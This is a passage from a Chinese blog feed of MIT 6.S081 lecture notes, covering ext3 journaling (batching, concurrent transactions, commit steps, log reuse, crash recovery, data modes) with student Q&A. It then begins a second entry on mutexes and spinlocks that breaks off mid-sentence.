>学生提问：这是不是有时也被称为flush，因为我之前经常听到这个单词？</p><p>Robert教授：是的，一个合理的解释fsync的工作的方式是，它flush了所有文件相关的写磁盘操作到了磁盘中，之后再返回，所以flush也是针对这个场景的一个合理的单词。</p></blockquote><p>下一个ext3使用的技术是批量执行（batching）。在任何时候，ext3只会有一个opentransaction。ext3中的一个transaction可以包含多个不同的系统调用。所以ext3是这么工作的：它首先会宣告要开始一个新的transaction，接下来的几秒所有的系统调用都是这个大的transaction的一部分。我认为默认情况下，ext3每5秒钟都会创建一个新的transaction，所以每个transaction都会包含5秒钟内的系统调用，这些系统调用都打包在一个transaction中。在5秒钟结束的时候，ext3会commit这个包含了可能有数百个更新的大transaction。</p><p>为什么这是个好的方案呢？</p><ul><li>首先它在多个系统调用之间分摊了transaction带来的固有的损耗。固有的损耗包括写transaction的descriptorblock和commitblock；在一个机械硬盘中需要查找log的位置并等待磁碟旋转，这些都是成本很高的操作，现在只需要对一批系统调用执行一次，而不用对每个系统调用执行一次这些操作，所以batching可以降低这些损耗带来的影响。</li><li>另外，它可以更容易触发writeabsorption。经常会有这样的情况，你有一堆系统调用最终在反复更新相同的一组磁盘block。举个例子，如果我创建了一些文件，我需要分配一些inode，inode或许都很小只有64个字节，一个block包含了很多个inode，所以同时创建一堆文件只会影响几个block的数据。类似的，如果我向一个文件写一堆数据，我需要申请大量的datablock，我需要修改表示block空闲状态的bitmapblock中的很多个bit位，如果我分配到的是相邻的datablock，它们对应的bit会在同一个bitmapblock中，所以我可能只是修改一个block的很多个bit位。所以一堆系统调用可能会反复更新一组相同的磁盘block。通过batching，多次更新同一组block会先快速的在内存的blockcache中完成，之后在transaction结束时，一次性的写入磁盘的log中。这被称为writeabsorption，相比一个类似于XV6的同步文件系统，它可以极大的减少写磁盘的总时间。</li><li>最后就是diskscheduling。假设我们要向磁盘写1000个block，不论是在机械硬盘还是SSD（机械硬盘效果会更好），一次性的向磁盘的连续位置写入1000个block，要比分1000次每次写一个不同位置的磁盘block快得多。我们写log就是向磁盘的连续位置写block。通过向磁盘提交大批量的写操作，可以更加的高效。这里我们不仅通过向log中连续位置写入大量block来获得更高的效率，甚至当我们向文件系统分区写入包含在一个大的transaction中的多个更新时，如果我们能将大量的写请求同时发送到驱动，即使它们位于磁盘的不同位置，我们也使得磁盘可以调度这些写请求，并以特定的顺序执行这些写请求，这也很有效。在一个机械硬盘上，如果一次发送大量需要更新block的写请求，驱动可以对这些写请求根据轨道号排序。甚至在一个固态硬盘中，通过一次发送给硬盘大量的更新操作也可以稍微提升性能。所以，只有发送给驱动大量的写操作，才有可能获得diskscheduling。这是batching带来的另一个好处。</li></ul><p>ext3使用的最后一个技术就是concurrency，相比XV6这里包含了两种concurrency。</p><ul><li>首先ext3允许多个系统调用同时执行，所以我们可以有并行执行的多个不同的系统调用。在ext3决定关闭并commit当前的transaction之前，系统调用不必等待其他的系统调用完成，它可以直接修改作为transaction一部分的block。许多个系统调用都可以并行的执行，并向当前transaction增加block，这在一个多核计算机上尤其重要，因为我们不会想要其他的CPU核在等待锁。在XV6中，如果当前的transaction还没有完成，新的系统调用不能继续执行。而在ext3中，大多数时候多个系统调用都可以更改当前正在进行的transaction。</li><li>另一种ext3提供的并发是，可以有多个不同状态的transaction同时存在。所以尽管只有一个opentransaction可以接收系统调用，但是其他之前的transaction可以并行的写磁盘。这里可以并行存在的不同transaction状态包括了：<ul><li>首先是一个open transaction</li><li>若干个正在commit到log的transaction，我们并不需要等待这些transaction结束。当之前的transaction还没有commit并还在写log的过程中，新的系统调用仍然可以在当前的opentransaction中进行。</li><li>若干个正在从cache中向文件系统block写数据的transaction</li><li>若干个正在被释放的transaction，这个并不占用太多的工作</li></ul></li></ul><p>通常来说会有位于不同阶段的多个transaction，新的系统调用不必等待旧的transaction提交到log或者写入到文件系统。对比之下，XV6中新的系统调用就需要等待前一个transaction完全完成。</p><blockquote><p>学生提问：如果一个blockcache正在被更新，而这个block又正在被写入到磁盘的过程中，会怎样呢？</p><p>Robert教授：这的确会是一个问题，这里有个潜在的困难点，因为transaction写入到log中的内容只能包含由该transaction中的系统调用所做的更新，而不能包含在该transaction之后的系统调用的更新。因为如果这么做了的话，那么可能log中会只包含系统调用的部分更新，而我们需要确保transaction包含系统调用的所有更新。所以我们不能承担transaction包含任何在该transaction之后的更新的风险。</p><p>ext3是这样解决这个问题的，当它决定结束当前的opentransaction时，它会在内存中拷贝所有相关的block，之后transaction的commit是基于这些block的拷贝进行的。所以transaction会有属于自己的block的拷贝。为了保证这里的效率，操作系统会使用copy-on-write来避免不必要的拷贝，这样只有当对应的block在后面的transaction中被更新了，它在内存中才会实际被拷贝。</p></blockquote><p>concurrency之所以能帮助提升性能，是因为它可以帮助我们并行的运行系统调用，我们可以得到多核的并行能力。如果我们可以在运行应用程序和系统调用的同时，来写磁盘，我们可以得到I/Oconcurrency，也就是同时运行CPU和磁盘I/O。这些都能帮助我们更有效，更精细的使用硬件资源。</p><h3 id="ext3文件系统调用格式">ext3文件系统调用格式</h3><p>在Linux的文件系统中，我们需要每个系统调用都声明一系列写操作的开始和结束。实际上在任何transaction系统中，都需要明确的表示开始和结束，这样之间的所有内容都是原子的。所以系统调用中会调用start函数。ext3需要知道当前正在进行的系统调用个数，所以每个系统调用在调用了start函数之后，会得到一个handle，它某种程度上唯一识别了当前系统调用。当前系统调用的所有写操作都是通过这个handle来识别跟踪的。之后系统调用需要读写block，它可以通过get获取block在buffer中的缓存，同时告诉handle这个block需要被读或者被写。如果你需要更改多个block，类似的操作可能会执行多次。之后是修改位于缓存中的block。当这个系统调用结束时，它会调用stop函数，并将handle作为参数传入。</p><p>除非transaction中所有已经开始的系统调用都完成了，transaction是不能commit的。因为可能有多个transaction，文件系统需要有种方式能够记住系统调用属于哪个transaction，这样当系统调用结束时，文件系统就知道这是哪个transaction正在等待的系统调用，所以handle需要作为参数传递给stop函数。</p><p>因为每个transaction都有一堆block与之关联，修改这些block就是transaction的一部分内容，所以我们将handle作为参数传递给get函数是为了告诉logging系统，这个block是handle对应的transaction的一部分。</p><p>stop函数并不会导致transaction的commit，它只是告诉logging系统，当前的transaction少了一个正在进行的系统调用。transaction只能在所有已经开始了的系统调用都执行了stop之后才能commit。所以transaction需要记住所有已经开始了的handle，这样才能在系统调用结束的时候做好记录。</p><h3 id="ext3的transaction">ext3的transaction</h3><p>基于上面的系统调用的结构，接下来我将介绍committransaction完整的步骤。每隔5秒，文件系统都会commit当前的opentransaction，下面是commit transaction涉及到的步骤：</p><ol type="1"><li>首先需要阻止新的系统调用。当我们正在commit一个transaction时，我们不会想要有新增的系统调用，我们只会想要包含已经开始了的系统调用，所以我们需要阻止新的系统调用。这实际上会损害性能，因为在这段时间内系统调用需要等待并且不能执行。</li><li>第二，需要等待包含在transaction中的已经开始了的系统调用们结束。所以我们需要等待transaction中未完成的系统调用完成，这样transaction能够反映所有的写操作。</li><li>一旦transaction中的所有系统调用都完成了，也就是完成了更新cache中的数据，那么就可以开始一个新的transaction，并且让在第一步中等待的系统调用继续执行。所以现在需要为后续的系统调用开始一个新的transaction。</li><li>还记得ext3中的log包含了descriptor，data和commitblock吗？现在我们知道了transaction中包含的所有的系统调用所修改的block，因为系统调用在调用get函数时都将handle作为参数传入，表明了block对应哪个transaction。接下来我们可以更新descriptorblock，其中包含了所有在transaction中被修改了的block编号。</li><li>我们还需要将被修改了的block，从缓存中写入到磁盘的log中。之前有同学问过，新的transaction可能会修改相同的block，所以在这个阶段，我们写入到磁盘log中的是transaction结束时，对于相关blockcache的拷贝。所以这一阶段是将实际的block写入到log中。</li><li>接下来，我们需要等待前两步中的写log结束。</li><li>之后我们可以写入commit block。</li><li>接下来我们需要等待写commitblock结束。结束之后，从技术上来说，当前transaction已经到达了commitpoint，也就是说transaction中的写操作可以保证在面对crash并重启时还是可见的。如果crash发生在写commitblock之前，那么transaction中的写操作在crash并重启时会丢失。</li><li>接下来我们可以将transaction包含的block写入到文件系统中的实际位置。</li><li>在第9步中的所有写操作完成之后，我们才能重用transaction对应的那部分log空间。</li></ol><p>在一个非常繁忙的系统中，log的头指针一直追着尾指针在跑（注，也就是说一直没有新的log空间）。在当前最早的transaction的所有步骤都完成之前，或许不能开始commit一个新的transaction，因为我们需要重复利用最早的transaction对应的log空间。不过人们通常会将log设置的足够大，让这种情况就不太可能发生。</p><blockquote><p>学生提问：你刚刚说没有进程会等待这些步骤完成，那么这些步骤是在哪里完成的呢？</p><p>Robert教授：这些是在后台的内核线程完成的。</p><p>学生提问：我有个有关重用log空间的问题，假设我们使用了一段特定的log空间，并且这段log空间占据了是刚刚释放出来的所有log空间，但是还不够，那么文件系统会等待另一部分的log空间释放出来吗，还是会做点别的？</p><p>Robert教授：是的，会等待。让我画张图来确保我回答的是正确的问题。我们可以认为log是磁盘中的一段线性空间，假设现存的transaction中最早的是T7，之后是T8，T9，我们想要将T10放在T9之后的空闲区域。</p></blockquote><blockquote><p>我们或许要等待T7将所有的block写入到文件系统对应的位置，这样我们才能释放T7对应的空间。这意味着T10中的步骤需要暂停以等待T7释放出来。这是你的问题吗？</p><p>同一个学生：是的，所以可能是这样，我先写入T10的block到现有的log空闲区域，但是如果最后log足够大并且我们用光了空闲区域，我们就需要等待T7的空间被释放出来，是吗？</p><p>Robert教授：是的，如果需要写入的数据足够多，并且log迅速的用光了。我们甚至都不能在释放log空间之前开始新的系统调用。如果你们关注细节的话，这里会有一些潜在的死锁。首先系统调用需要预声明需要多少个block，这样logging系统才知道对于该transaction需要多少log空间，因为我们不会在没有足够空间来committransaction时，开始一个新的transaction（注，难道不能将不能写入到磁盘log中的transaction先缓存在内存中吗？虽然这样可能会导致堆积）。</p><p>学生提问：如果新的transaction需要的空间走到了T8，那么现在就需要等待T7，T8结束，这是怎么工作的呢？</p><p>Robert教授：图中的T7，T8，T9其中的系统调用都完成了，并且都已经在commit到log中了。在上面的图中，我们会直接开始T10，新的系统调用会写入到transactionT10，最终当T10需要commit到log中，并且它大到需用用到T8的空间时，它需要等待T7，T8结束。文件系统会记录每个transaction的大小，这样文件系统就知道要等待多少个之前的transaction结束。所以这里还有不少的记录工作，这样文件系统才能理解所有旧的transaction的状态。</p></blockquote><p>有关如何重用log空间，这里有个小细节。在log的最开始有一个superblock，所以在任何时候log都是由一个superblock和一些transaction组成。假设T4是最新的transaction，之前是T1，T2，T3。</p><figure><imgsrc="https://tnrhmtc0g9.feishu.cn/space/api/box/stream/download/asynccode/?code=MDE1MjdjYjQ0ZmJjZTQzMWMzZWMzMzY5MzlhMWNkY2VfbFZWTGpuS3pNNnh4V25sN2tFcHVMRnNpbzdLd3JnWlFfVG9rZW46SE1EdWJ0bGtxb3BxeVZ4TURjZGNKb1dmblFkXzE2OTY1NzQxNTI6MTY5NjU3Nzc1Ml9WNA"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>我们是否能重用一段log空间，取决于相应的transaction，例如T2，是否已经commit并且写入到文件系统的实际位置中，这样在crash并重启时就不需要重新执行这段transaction了。同时也取决于T2之前的的所有transaction是否已经被释放了。所有的这些条件都满足时，我们就可以释放并重用T2对应的log空间。</p><h3 id="ext3-recovery">ext3 recovery</h3><p>为了简化重启时恢复软件的工作，当决定释放某段log空间时，文件系统会更新superblock中的指针将其指向当前最早的transaction的起始位置。</p><p>之后如果crash并重启，恢复软件会读取superblock，并找到log的起始位置。所以如果crash了，内存中的所有数据都会消失，例如文件系统中记录的哪些block被写入到了磁盘中这些信息都会丢失，所以可以假设这时内存中没有可用的数据，唯一可用的数据存在于磁盘中。当然我们这里的讨论都是基于磁盘还是完好的，所以你可以认为只是一次电力故障，系统突然停止了运行过程，在电力恢复时，断电那一瞬间磁盘中的数据还存在。我们并没有考虑磁盘被损坏或者被摧毁的情况。</p><p>crash或许会打断任何在进行中的transaction，或许transaction正在commit，或许transaction正在向文件系统写block。让我重新画一个例子，我们在log中有一个superblock，之后是transactionT6，T7，T8，在T8之后是一个已近被释放了log空间的T5，假设T8已经用了T5的一部分空间。并且现在superblock指向的是T6的起始位置，因为T6是最早的transaction。</p><figure><imgsrc="https://tnrhmtc0g9.feishu.cn/space/api/box/stream/download/asynccode/?code=MWQxMWU1YzllNDBkZTYyOTI5NGEyMmNlNTY4MWFlZThfSWwzRzQ1Vnpmc1BDV1lpdlJJSFJpOGYxQ0xiVDd2RzNfVG9rZW46RXh5eWJodTJxb1FOZXJ4M1JEQmNxNGJrbnNiXzE2OTY1NzQxNTI6MTY5NjU3Nzc1Ml9WNA"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>现在crash并重启，恢复软件读取superblock就可以知道log的起始位置，之后恢复软件会在log中一直扫描并尝试找到log的结束位置，现在我们需要有一种方式确定log的结束位置。我们知道每个transaction包含了一个descriptorblock，里面记录了该transaction中包含了多少个data block，假设descriptorblock记录了17个block，那么恢复软件会扫描17个data block，最后是commitblock。这样可以一直扫描到T8。</p><figure><imgsrc="https://tnrhmtc0g9.feishu.cn/space/api/box/stream/download/asynccode/?code=NjE4MmIyMDAzNTE5ZmM5YjUzNzFmNGRlNmQ0MGE2YWFfOG16ZGlwQTlHOXdXZFJGdExOZngzZDJHNkdQaUpCUFZfVG9rZW46SlA4TWJua1Jrb3VaMGF4SHJ4UWNrM2Nubk9nXzE2OTY1NzQxNTI6MTY5NjU3Nzc1Ml9WNA"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>在扫描T8时有两种可能，一种可能是T8完成了commit，并且包含了commitblock。这时恢复软件并不知道T8就是最后一个transaction，所以它会接着看T8的commitblock的下一个block，来看看这是不是一个有效的descriptorblock。我们知道这不是一个descriptorblock，而是一个包含在T5内的随机block。现在的问题是恢复软件如何可靠的区分出来呢？是的，每个descriptor和commitblock都以某个魔法数字作为起始，这是一个32bit的数字。所以如果扫描完了T8，下一个block以魔法数字作为起始，那么恢复软件就会认为这是一个descriptorblock。（注，也有可能T5正好完美的跟在T8后面，也就是说T8的commitblock之后就是T5的descriptor block，同时T5的commitblock也存在，所以这里必然还需要一些其他的机制，我猜是用到了transaction的序列号）</p><p>但是，现在我们看到的block可能是包含了任意数据的datablock，所以它可能是文件中的一个datablock并且也是以魔法数字作为起始。所以这里的最后一个细节是，logging系统需要能区分一个以魔法数字作为起始的descriptorblock和一个以魔法数字作为起始的datablock。你可以想到各种方法来实现这种区分，ext3是这样做的，当它向log写一个block时，如果这个block既不是descriptorblock也不是commitblock，但是又以魔法数字作为起始，文件系统会以0替换前32bit，并在transaction的descriptorblock中为该data block设置一个bit。这个bit表示，对应的datablock本来是以魔法数字作为起始，但是现在我们将其替换成了0。而恢复软件会检查这个bit位，在将block写回到文件系统之前，会用魔法数字替换0。</p><p>因此，在log中，除了descriptor和commitblock，不会有其他的block以这32bit的魔法数字作为起始。所以我们不会有模棱两可的判断，如果一个commitblock之后的block以魔法数字作为起始，那么它必然是一个descriptorblock。所以恢复软件会从super block指向的位置开始一直扫描，直到：</p><ul><li>某个commit block之后的一个block并不是descriptor block</li><li>或者某个commit block之后是descriptor block，但是根据descriptorblock找到的并不是一个commit block</li></ul><p>这时，恢复软件会停止扫描，并认为最后一个有效的commitblock是log的结束位置。或许在最后一个commitblock之后会跟一个并没有commit完成的transaction（注，上面的第二种情况），但是恢复软件会忽略未完成的transaction，因为这个transaction并没有包含所有的写操作，所以它并不能原子性的恢复。之后恢复软件会回到log的最开始位置，并将每个logblock写入到文件系统的实际位置，直到走到最后一个有效的commitblock。之后才是启动剩下的操作系统，并且运行普通的程序。在恢复完成之前，是不能运行任何程序的，因为这个时候文件系统并不是有效的。</p><blockquote><p>学生提问：XV6相比这里的log机制，缺少了什么呢？</p><p>Robert教授：XV6主要缺失的是在log中包含多个transaction的能力，在XV6的log中最多只会有一个transaction，所以在XV6中缺少了并发的能力。比如说当我在执行transactionT7的系统调用时，ext3可以同时向磁盘提交T6，而这在XV6中这是不可能的，因为log只保存了一个transaction。所以我们必须先完成一个transaction的所有工作，之后才能开始下一个transaction。所以XV6是简单且正确的，但是缺少了并发的能力。</p><p>学生提问：但是在XV6我还是可以有多个transaction，只是说不能异步的执行它们，对吗？</p><p>Robert教授：这里其实有点模糊，XV6实际上允许在一个transaction中包含多个系统调用（注，详见15.8），所以XV6有一些并发和batching的能力，但是当XV6决定要commit一个transaction时，在完全完成这个transaction之前，是不能执行任何新的系统调用的。因为直到前一个transaction完全完成，并没有log空间来存放新的系统调用。所以XV6要么是在运行一些系统调用，要么是在committransaction，但是它不能同时干这两件事情，而ext3可以同时干这两件事情。</p></blockquote><h3id="为什么ext3里新的transaction要等待前一个transaction">为什么ext3里新的transaction要等待前一个transaction</h3><p>以上就是ext3中相对来说直观的部分。实际上还有一些棘手的细节我想讨论一下。之前我提到过，ext3中存在一个opentransaction，但是当ext3决定要关闭该transaction时，它需要等待该transaction中的所有系统调用都结束，之后才能开始新的transaction。假设我们现在有transactionT1，其中包含了多个系统调用。</p><p>如果我们想要关闭T1，我们需要停止接收新的系统调用，因为我们想要等待现有的系统调用结束，这样才能committransaction。所以直到这些系统调用都结束了，在ext3中不能允许开始任何新的系统调用。所以只有在T1中的系统调用完成之后，才能开始在接下来的transactionT2中接收系统调用。在这之间有一段时间，新的系统调用是被拦截的，这降低了性能，因为我们本来应该执行系统调用的但是又不被允许。</p><figure><imgsrc="https://tnrhmtc0g9.feishu.cn/space/api/box/stream/download/asynccode/?code=MzFkZjQzNDg5N2FlNWU1NTY5ZjkzZGI3YTY3MDI4NjZfMXpDTGFmTUp0Y0lpZFF5Z0duVFJiQ1ViUkJlbDBLN2xfVG9rZW46WGxLU2J4d0o2bzlMdlR4VFhpVWNVVVR0bkxjXzE2OTY1NzQxNTI6MTY5NjU3Nzc1Ml9WNA"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>这里的问题是，直到T1中所有的系统调用都结束之前，ext3为什么不让T2中的系统调用开始执行呢？让我们来看一下没有这个限制条件可能会带来的错误的场景。我们假设T1只包含了一个系统调用，这是一个create系统调用用来创建文件x。在create系统调用结束之前，文件系统决定开始一个新的transactionT2用来接收create之后的所有系统调用。我们假设T2在T1结束之前就开始了，T2对另一个文件y调用了unlink系统调用。unlink会释放与y关联的inode。</p><p>假设在下面的时间点T2将inode标记为空闲的，create会为x分配inode，或许它在之后的一个时间点分配了inode。</p><figure><imgsrc="https://tnrhmtc0g9.feishu.cn/space/api/box/stream/download/asynccode/?code=ZTRjZmNkNzYwZDg3MzhkOWQxOTZiMTM4MzlhMThjMDJfRjkzSmFhVDl6S2IyMkFaZXg4YkYzajhIZFU4TFdXOHpfVG9rZW46RkVuemJpVEVUbzlXUnN4cmg5eGNuNHlSbm5jXzE2OTY1NzQxNTI6MTY5NjU3Nzc1Ml9WNA"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>因为create在unlink释放inode之后分配的inode，它可能会重用同一个inode，所以x可能会获得y的inode，假设是inode17。目前为止没有问题，因为unlink本来就是释放inode。当T1中的create结束之后，我们会关闭T1，在最后我们会将T1的所有更新都写入到磁盘的log中。之后unlink还要花点时间才能结束，但是在它结束之前计算机crash了。</p><figure><imgsrc="https://tnrhmtc0g9.feishu.cn/space/api/box/stream/download/asynccode/?code=ZmU1NmJkZmFlZTVhNmUwMzk4ZmI4NGI0ZGY0YjNlOWZfTXN1WUVHTmhNVW1LSG1SZFE1RHg0QkIyd3JYV3dPM0dfVG9rZW46RmxtOGJKVTZLbzllSnd4YmxrWGNoZTZUbjR3XzE2OTY1NzQxNTI6MTY5NjU3Nzc1Ml9WNA"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>在重启并运行恢复软件时，可以发现T1已经commit了，而T2没有。所以恢复软件会完全忽略T2，这意味着T2中的unlink就跟没有发生过一样，恢复软件不会执行T2中的unlink，也就不会删除文件y。所以crash并重启之后y文件仍然存在，并还在使用inode17。然而T1又完成了，x文件使用的也是inode17，所以现在我们错误的有了两个文件都使用了相同的inode，这意味着它们共享了文件内容，向一个文件写数据会神奇的出现在另一个文件中。这完全是错误的，因为我们本来想的是删除y，并为x分配一个空闲的inode，而不是一个已经在使用中的inode。这里可以这么想，T2中的unlink修改了一个block，最终这个修改过的block被前一个transaction所使用。T2中修改的信息，被T1所使用了，这意味着我们丢失了T2的原子性。因为T2的目标是unlink的效果要么是全发生，要么是完全不发生。但是刚刚的例子中，因为T1使用了T2中释放的inode，这意味着T2中部分修改已经生效了，但是其他的修改随着crash又丢失了。</p><p>或许你可以想到一些修复这里问题的方法，或许T1可以发现inode是由后一个transaction释放的而不去使用它。而ext3采用了一个非常简单的方法，在前一个transaction中所有系统调用都结束之前，它不允许任何新的系统调用执行。所以transactionT1也就不可能看到之后的transaction包含的更新。因为直到T1commit了，整个unlink都不被允许执行。</p><blockquote><p>学生提问：当你关闭一个opentransaction时，具体会发生什么呢？会对当前的缓存做一个快照吗？</p><p>Robert教授：会的，当我们关闭一个transaction，文件系统会拷贝被transaction中的系统调用所修改的所有block，之后transaction才会commit这些block。后面的transaction会在真正的blockcache上运行。当将block都commit到log之后，对于blockcache的拷贝就可以丢弃了。</p></blockquote><p>以上是众多ext3需要处理的小细节之一，因为为了支持并发，ext3需要处理各种各样的特殊细节，但是我们没有时间讨论所有的细节。</p><h3 id="总结">总结</h3><p>最后我希望同学们记住的有关logging和ext3的是：</p><ul><li>log是为了保证多个步骤的写磁盘操作具备原子性。在发生crash时，要么这些写操作都发生，要么都不发生。这是logging的主要作用。</li><li>logging的正确性由write aheadrule来保证。你们将会在故障恢复相关的业务中经常看到write aheadrule或者write ahead log（WAL）。write aheadrule的意思是，你必须在做任何实际修改之前，将所有的更新commit到log中。在稍后的恢复过程中完全依赖writeaheadrule。对于文件系统来说，logging的意义在于简单的快速恢复。log中可能包含了数百个block，你可以在一秒钟之内重新执行这数百个block，不管你的文件系统有多大，之后又能正常使用了。</li><li>最后有关ext3的一个细节点是，它使用了批量执行和并发来获得可观的性能提升，不过同时也带来了可观的复杂性的提升。</li></ul><p>以上就是今天的内容，接下来是问答环节：</p><blockquote><p>学生提问：你刚刚说有一个文件系统线程会做这里所有的工作，那么只能有一个这样的线程，否则的话就会有不同步的问题了，对吗？</p><p>Robert教授：或许真的只有一个线程，我其实不知道有多少个线程，但是1是个不错的数字，因为logging的正确性取决于旧的transaction要在新的transaction之前提交。但是逻辑上来说又没有必要只有一个线程，你可以想象不同的transaction使用不同的线程来提交（注，只要锁加的合适多个线程应该也是没问题的）。</p><p>学生提问：当你在讨论crash的时候，你有一个图是T8正在使用之前释放的T5的空间，如果T8在crash的时候还没有commit，并且T5的commitblock正好在T8的descriptorblock所指定的位置，这样会不会不正确的表明T8已经被commit了（注，这时T8有一个假的commitblock）？</p><p>Robert教授：让我尝试画出这里的场景。首先我们有一个古老的transactionT5，因为log的循环特性，在顺序上T8位于T5之前。因为T5已经被释放了，T8正在蚕食T5的log空间。假设T8没有完成commit，但是如果完成commit的话，T8的commitblock会写到T5的commit block位置。</p></blockquote><figure><imgsrc="https://tnrhmtc0g9.feishu.cn/space/api/box/stream/download/asynccode/?code=ZmVkYTg5OWZiNDk3MzQ0OWQ4NzE1YzM4YTAxYTBmYWNfcXJqWnJON3B1d0taZkw3SFp3Umh1emJ6TFJraGVnV0tfVG9rZW46TDJNMWJHQVJzb3B1SlJ4UmM4S2NmZlhZbnRiXzE2OTY1NzQxNTI6MTY5NjU3Nzc1Ml9WNA"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><blockquote><p>T8并没有能写入commitblock，T8前面所有的block都写入了，但是最后跟的是T5的commitblock。这里的答案是，descriptor block和commitblock都有transaction的序列号，所以T8的descriptorblock里面的序列号是8，但是T5的commitblock里面的序列号是5，所以两者不能匹配。</p><p>学生提问：我们可以在transaction T8开始的时候就知道它的大小吗？</p><p>Robert教授：这是个复杂的问题。当T8作为活跃的transaction开始时，系统调用会写入数据，这时文件系统并不知道T8有多大。当文件系统开始commitT8时，是知道T8有多大的，因为文件系统只会在T8中所有的系统调用都结束之后才commit它，而在那个时间点，文件系统知道所有的写操作，所以就知道T8究竟有多大。除此之外，descriptorblock里面包含了所有block的实际编号，所以当写入transaction的第一个block，也就是descriptorblock时，logging系统知道T8会包含多少个block。</p><p>学生提问：为什么不在descriptorblock里面记录commit信息。虽然这样可能不太好，因为要回到之前的一个位置去更新之前的一个block。</p><p>Robert教授：所以这里的提议是，与其要一个专门的commitblock，可以让descriptor block来实现commitblock的功能。XV6与这个提议非常像，我认为可以这么做，至少在ext3中这么做了不会牺牲性能。你需要像XV6一样来组织这里的结构，也就是需要在descriptorblock包含某个数据表明这是一个已经提交过的transaction。</p><p>这样做的话，可以节省一个commitblock的空间，但是不能节省整个时间。Linux文件系统的后续版本实现了你的提议，ext4做了以下工作来更有效的写commitblock。ext4会同时写入所有的data block和commitblock，它并不是等待所有的data block写完了之后才写的commitblock。但是这里有个问题，磁盘可以无序的执行写操作，所以磁盘可能会先写commitblock之后再写data block。如果中间有了crash，那么我们有了commitblock，但是却没有全部的data block。ext4通过在commitblock中增加校验和来避免这种问题。所以commitblock写入之后发生了crash，如果datablock没有全写入那么校验和不能得出正确的结果，恢复软件可以据此判断出错了。ext4可以通过这种方式在机械硬盘上写入一批block而避免磁碟旋转，进而提升磁盘性能。</p><p>学生提问：log中的data block是怎么写入到文件系统中的？</p><p>Robert教授：这个问题有多个答案。对于datablock，ext3有三种模式，但是我只记得两个，journaled data和ordereddata（注，第三种是writeback）。当你在配置ext3文件系统时，你需要告诉Linux你想要哪种模式。如果你想要的是journaleddata，文件内容就是写入到log中，如果你向一个文件写数据，这会导致inode更新，log中会包含文件数据和更新了的inode，也就是说任何更新了的block都会记录在log中。这种方法非常慢，因为数据需要先写在log中，再写到文件系统中。所以journaleddata很直观，但是很慢。</p><p>ordereddata是最流行的模式，它不会将文件数据写入到log中，只会将metadatablock，例如inode，目录block，写入到log中，文件的内容会直接写到文件系统的实际位置中。所以这种模式要快得多，因为你不用将文件内容写两次。但是它也会导致更多的复杂性，因为你不能随时写入文件内容。假设你执行一个写操作导致一个新的block被分配给一个文件，并将包含了新分配block编号的inode写入到log中并commit，在实际写入文件内容至刚刚分配的datablock之前发生crash。在稍后的恢复流程中，你将会看到包含了新分配的block编号的inode，但是对应datablock里面的内容却属于之前使用了这个datablock的旧的文件。如果你运行的是一个类似Athena的多用户系统，那么可能就是一个用户拥有一个文件，其中的内容又属于另一个用户已经删除的文件，如果我们不是非常小心的处理写入数据和inode的顺序就会有这样的问题。</p><p>ext3的ordereddata通过先写入文件内容到磁盘中，再commit修改了的inode来解决这里的问题。如果你是个应用程序，你写了一个文件并导致一个新的文件系统datablock被分配出来，文件系统会将新的文件内容写到新分配的datablock中，之后才会commit transaction，进而导致inode更新并包含新分配的datablock编号。如果在写文件数据和更新inode之间发生了crash，你也看不到其他人的旧的数据，因为这时就算有了更新了的datablock，但是也没关系，因为现在不仅inode没有更新，连bitmapblock也没更新，相应的datablock还处于空闲状态，并且可以分配给其他的程序，你并不会因此丢失block。这里的效果就是我们写了一个datablock但是最终并没有被任何文件所使用。</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>操作系统</category>
      
    </categories>
    
    
    <tags>
      
      <tag>操作系统，计算机基础, C</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Lock</title>
    <link href="/emocoder/2023/10/05/oslearning/mit-6.s081/lock/lock/"/>
    <url>/emocoder/2023/10/05/oslearning/mit-6.s081/lock/lock/</url>
    
    <content type="html"><![CDATA[<p>app wants to multiple cores. Kernel must handle parallel syscalls andaccess shared data structures in parallel.</p><ul><li>locks for correct sharing</li><li>locks can limit performance</li></ul><p>为什么使用锁？避免race conditions</p><p>加锁的目的就是保证共享资源在任意时间内，只有一个线程可以访问，以此避免数据共享导致错乱的问题（避免racecondition）。最底层就是两种锁：「互斥锁」和「自旋锁」，其他高级锁，如读写锁、悲观锁、乐观锁等都是基于它们实现的。</p><ul><li><strong>互斥锁</strong>加锁失败后，线程释放CPU，给其他线程；</li><li><strong>自旋锁</strong>加锁失败后，线程会忙等待，直到它拿到锁；</li></ul><p>xv6里的有两种锁，spinlock和sleeplock，sleeplock是基于spinlock和sleep实现的</p><h2 id="互斥锁">互斥锁</h2><p>互斥锁是一种「独占锁」，比如当线程 A 加锁成功后，此时互斥锁已经被线程A 独占了，只要线程 A 没有释放手中的锁，线程 B加锁就会失败，失败的线程B于是就会释放 CPU 让给其他线程，<strong>既然线程B 释放掉了 CPU，自然线程 B 加锁的代码就会被阻塞</strong>。</p><p><strong>对于互斥锁加锁失败而阻塞的现象，是由操作系统内核实现的</strong>。当加锁失败时，内核会将线程置为「睡眠」状态，等到锁被释放后，内核会在合适的时机唤醒线程，当这个线程成功获取到锁后，于是就可以继续执行</p><p>互斥锁加锁失败，就会从用户态陷入内核态，内核帮我们切换线程，这简化了互斥锁使用的难度，但也存在性能开销。</p><p>那这个开销成本是什么呢？会有<strong>两次线程上下文切换的成本</strong>：</p><ul><li>当线程加锁失败时，内核会把线程的状态从「运行」状态设置为「睡眠」状态，然后把CPU 切换给其他线程运行；</li><li>接着，当锁被释放时，之前「睡眠」状态的线程会变为「就绪」状态，然后内核会在合适的时间，把CPU 切换给该线程运行。</li></ul><h2 id="自旋锁">自旋锁</h2><p>自旋锁是最比较简单的一种锁，一直自旋，利用 CPU周期，直到锁可用。<strong>需要注意，在单核 CPU上，需要抢占式的调度器（即通过时钟中断一个线程，运行其他线程）。否则，自旋锁在单CPU 上无法使用，因为一个自旋的线程永远不会放弃 